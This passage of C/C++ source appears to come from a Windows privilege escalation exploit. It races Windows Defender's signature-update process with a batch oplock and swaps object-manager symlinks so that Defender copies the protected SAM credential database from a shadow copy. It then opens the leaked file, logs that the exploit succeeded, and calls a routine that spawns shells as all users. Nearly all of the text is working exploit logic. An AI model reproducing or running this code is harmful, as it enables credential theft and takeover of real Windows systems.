				LOG_ERR("MAIN", "OpenThread(current) failed");
				goto cleanup;
			}
			wchar_t thrdupdpath[MAX_PATH] = { 0 };
			wsprintf(thrdupdpath, L"\\\\?\\GLOBALROOT\\Sessions\\%d\\BaseNamedObjects\\%s\\WDUpdateDirectory", _sesid, wuid2);
			threadargs.dirpath = thrdupdpath;
			threadargs.hntfythread = hcurrentthread;
			threadargs.hevent = CreateEvent(NULL, FALSE, FALSE, NULL);
			hthread = CreateThread(NULL, NULL, WDCallerThread, (LPVOID)&threadargs, NULL, &tid);

			LOG_INFO("MAIN", "Invoking WD RPC and monitoring for new definition update directory...");
			wcscpy(newdefupdatedirname, L"C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\");
			do {
				ZeroMemory(buff, sizeof(buff));
				OVERLAPPED od = { 0 };
				od.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
				ReadDirectoryChangesW(hdir, buff, sizeof(buff), TRUE, FILE_NOTIFY_CHANGE_DIR_NAME, &retbytes, &od, NULL);
				HANDLE events[2] = { od.hEvent, threadargs.hevent };
				if (WaitForMultipleObjects(2, events, FALSE, INFINITE) - WAIT_OBJECT_0)
				{
					LOG("[ERROR][RPC] ServerMpUpdateEngineSignature ALPC call ended unexpectedly, RPC_STATUS=0x%08X\n", threadargs.res);
					goto cleanup;
				}
				CloseHandle(od.hEvent);

				PFILE_NOTIFY_INFORMATION pfni = (PFILE_NOTIFY_INFORMATION)buff;
				if (pfni->Action != FILE_ACTION_ADDED)
					continue;

				wcscat(newdefupdatedirname, pfni->FileName);
				break;
			} while (1);
			LOG_OK("MAIN", "New definition update directory detected: %ws", newdefupdatedirname);

			wcscpy(updatelibpath, L"\\??\\");
			wcscat(updatelibpath, updatepath);
			wcscat(updatelibpath, L"\\mpasbase.vdm");

			RtlInitUnicodeString(&unistrupdatelibpath, updatelibpath);
			InitializeObjectAttributes(&objattr, &unistrupdatelibpath, OBJ_CASE_INSENSITIVE, NULL, NULL);

			LOG_INFO("OPLOCK", "Opening %ws with DELETE_ON_CLOSE for oplock...", updatelibpath);
			ntstat = NtCreateFile(&hupdatefile, GENERIC_READ | DELETE | SYNCHRONIZE, &objattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, NULL, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_DELETE_ON_CLOSE, NULL, NULL);
			if (ntstat)
			{
				LOG_NT("ACCESS", ntstat, "NtCreateFile(%ws) failed", updatelibpath);
				goto cleanup;
			}
			LOG_OK("OPLOCK", "File opened, handle=0x%p", (void*)hupdatefile);
			LOG_INFO("OPLOCK", "Setting batch oplock on %ws", updatelibpath);

			ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
			DeviceIoControl(hupdatefile, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);

			if (GetLastError() != ERROR_IO_PENDING)
			{
				LOG_ERR("OPLOCK", "FSCTL_REQUEST_BATCH_OPLOCK on update file failed (not IO_PENDING)");
				goto cleanup;
			}
			LOG_OK("OPLOCK", "Batch oplock pending on %ws", updatelibpath);
			LOG_INFO("OPLOCK", "Waiting for oplock to trigger (WD reading mpasbase.vdm)...");
			GetOverlappedResult(hupdatefile, &ovd, &transfersz, TRUE);
			LOG_OK("OPLOCK", "Oplock triggered! Performing symlink swap...");

			CloseHandle(hsymlink);



			{
				UNICODE_STRING _unisrc = { 0 };
				RtlInitUnicodeString(&_unisrc, L"WDUpdateDirectory");
				OBJECT_ATTRIBUTES _smobjattr = { 0 };
				InitializeObjectAttributes(&_smobjattr, &_unisrc, OBJ_CASE_INSENSITIVE, hobjworkdir, NULL);
				UNICODE_STRING _unidest = { 0 };
				RtlInitUnicodeString(&_unidest, objdirpath);
					LOG_INFO("OBJMGR", "Re-creating WDUpdateDirectory symlink -> %ws", objdirpath);
					ntstat = _NtCreateSymbolicLinkObject(&hsymlink, GENERIC_ALL, &_smobjattr, &_unidest);
					if (ntstat)
					{
						LOG_NT("ACCESS", ntstat, "NtCreateSymbolicLinkObject(WDUpdateDirectory swap) failed");
						goto cleanup;
					}
					LOG_OK("OBJMGR", "WDUpdateDirectory symlink swapped");

					RtlInitUnicodeString(&objlinkname, L"mpasbase.vdm");
				ZeroMemory(nttargetfile, sizeof(nttargetfile));
				wcscpy(nttargetfile, fullvsspath);
				wcscat(nttargetfile, filestoleak[x]);
				RtlInitUnicodeString(&objlinktarget, nttargetfile);
				InitializeObjectAttributes(&objattr, &objlinkname, OBJ_CASE_INSENSITIVE, hobjworkdir, NULL);

				LOG_INFO("OBJMGR", "Creating symlink mpasbase.vdm -> %ws", nttargetfile);
				ntstat = _NtCreateSymbolicLinkObject(&hobjlink, GENERIC_ALL, &objattr, &objlinktarget);
				if (ntstat)
				{
					LOG_NT("ACCESS", ntstat, "NtCreateSymbolicLinkObject(mpasbase.vdm -> SAM) failed");
					goto cleanup;
				}
				LOG_OK("OBJMGR", "mpasbase.vdm -> SAM symlink created. WD will now copy SAM for us.");

			}


			CloseHandle(ov.hEvent);
			ov.hEvent = NULL;
			CloseHandle(ovd.hEvent);
			ovd.hEvent = NULL;
			CloseHandle(hupdatefile);
			hupdatefile = NULL;


			wcscat(newdefupdatedirname, L"\\mpasbase.vdm");

			LOG_INFO("MAIN", "Creating KTM transaction for safe file access...");
			htransaction = CreateTransaction(NULL, NULL, TRANSACTION_DO_NOT_PROMOTE, NULL, NULL, NULL, NULL);
			if (!htransaction)
			{
				LOG_ERR("MAIN", "CreateTransaction failed");
				goto cleanup;
			}
			LOG_INFO("MAIN", "Waiting for leaked SAM file at %ws...", newdefupdatedirname);
			do {
				hleakedfile = CreateFileTransacted(newdefupdatedirname, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL,htransaction,NULL,NULL);
			} while (hleakedfile == INVALID_HANDLE_VALUE || !hleakedfile);
			LOG_OK("MAIN", "Leaked SAM file opened: %ws", newdefupdatedirname);


			CloseHandle(hdir);
			hdir = NULL;
			CloseHandle(hobjlink);
			hobjlink = NULL;
			LOG_OK("EXPLOIT", "=== EXPLOIT SUCCEEDED === SAM file leaked via WD symlink race");
			SetEvent(hreleaseready);

			
			DoSpawnShellAsAllUsers(hleakedfile);
			CloseHandle(hleakedfile);
			hleakedfile = NULL;
			RollbackTransaction(htransaction);
			CloseHandle(htransaction);
			htransaction = NULL;
			WaitForSingleObject(hthread, INFINITE);
			CloseHandle(hthread);
			hthread = NULL;


			
		}

	}
	catch (int exception)
	{
		goto cleanup;
	}

cleanup:

	if(hint)
		InternetCloseHandle(hint);
	if(hint)
		InternetCloseHandle(hint2);
	if (exebuff)
		free(exebuff);
	if(mappedbuff)
		UnmapViewOfFile(mappedbuff);
	if (hmapping)
		CloseHandle(hmapping);
	if (hcabctx)
		FDIDestroy(hcabctx);
	if (hdir)
		CloseHandle(hdir);
	if (rdb)
		HeapFree(GetProcessHeap(), NULL, rdb);
	if (ov.hEvent)
		CloseHandle(ov.hEvent);
	if (ovd.hEvent)
		CloseHandle(ovd.hEvent);

	if (hreleaseready)
	{
		SetEvent(hreleaseready);
		Sleep(1000);
		CloseHandle(hreleaseready);
	}
	if (hleakedfile)
	{
		if (filelocked)
			UnlockFile(hleakedfile, NULL, NULL, NULL, NULL);
		CloseHandle(hleakedfile);
	}
	if (leakedfilebuff)
		free(leakedfilebuff);
	if (hcurrentthread)
		CloseHandle(hcurrentthread);
	if (needupdatedircleanup)
	{
		wchar_t dirtoclean[MAX_PATH] = { 0 };
		wcscpy(dirtoclean, updatepath);
		UpdateFilesListCurrent = UpdateFilesList;
		while(UpdateFilesListCurrent)
		{

			if (UpdateFilesListCurrent->filecreated)
			{
				wchar_t filetodel[MAX_PATH] = { 0 };
				wcscpy(filetodel, dirtoclean);
				wcscat(filetodel, L"\\");
				MultiByteToWideChar(CP_ACP, NULL, UpdateFilesListCurrent->filename, -1, &filetodel[lstrlenW(filetodel)], MAX_PATH - lstrlenW(filetodel) * sizeof(wchar_t));
				DeleteFile(filetodel);
			}
			if (UpdateFilesListCurrent->hsymlink) {
				CloseHandle(UpdateFilesListCurrent->hsymlink);
				UpdateFilesListCurrent->hsymlink = NULL;
			}
			UpdateFiles* UpdateFilesListOld = UpdateFilesListCurrent;
			UpdateFilesListCurrent = UpdateFilesListCurrent->next;
			free(UpdateFilesListOld);
		}
		RemoveDirectory(dirtoclean);
	}


	return 0;
}

